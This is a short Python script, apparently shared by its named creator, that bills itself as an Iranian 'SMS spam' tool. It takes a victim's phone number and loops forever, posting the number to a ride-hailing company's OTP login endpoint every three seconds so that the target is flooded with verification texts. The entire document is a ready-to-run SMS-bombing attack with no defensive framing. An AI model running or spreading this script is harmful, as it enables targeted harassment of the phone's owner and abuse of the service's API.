print("""                                
  ___ ___  ___ ___ _    ___ __ _  ___
 (_-</ _ \/ _ `/  ' \  (_-</  ' \(_-<
/___/ .__/\_,_/_/_/_/ /___/_/_/_/___/
   /_/                               

! Sms Spam Iran !

Creator : Mehrshad Biriya
Telegram : t.me/Mehrshad_biriya
Instagram : instagram.com/mehrshad._.biriya
....................................
""")

import requests
import time

try:
    print("Note : For Exit Tools ==> Ctrl + C \n")
    NumberPhone = input("Enter Number Phone (ex: 9120000000) = ")

    if NumberPhone == "" :
        print("\n[!] Please Enter Phone Number")
    else :
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        data = {"cellphone":"+98" + NumberPhone}

    while True:
        requests.post(url,data=data)
        print("[+] Send SMS For Victim")
        time.sleep(3)
except:
    print("\n[-] You Exit Tools !!")
